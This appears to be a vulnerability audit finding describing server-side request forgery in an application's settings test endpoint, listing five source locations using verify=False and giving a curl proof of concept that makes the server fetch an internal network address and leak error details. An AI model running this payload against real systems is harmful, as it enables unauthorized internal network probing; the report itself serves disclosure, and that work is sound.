# SSRF via verify=False connection tests

**Verification: CODE-VERIFIED**

## Description
Five requests calls with verify=False confirmed in source:
- `plex_utils.py:L33`, `plex_utils.py:L76`
- `manual.py:L84`
- `client.py:L17`
- `rootfolder.py:L22`

The /test endpoint drives server-side GET to arbitrary http(s) targets with raw exception text echoed back.

## Impact
Client performs SSRF: internal network probing with error-message oracle (internal host/port/banner disclosure via error text).

## PoC
```bash
curl -X POST "http://<host>:6767/api/system/settings/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://192.168.1.1:8080/internal"}' 
```

## Execution result
```
Code path analysis: verify=False at 5 confirmed locations; /test echoes
raw exception text including internal host/port information.
```
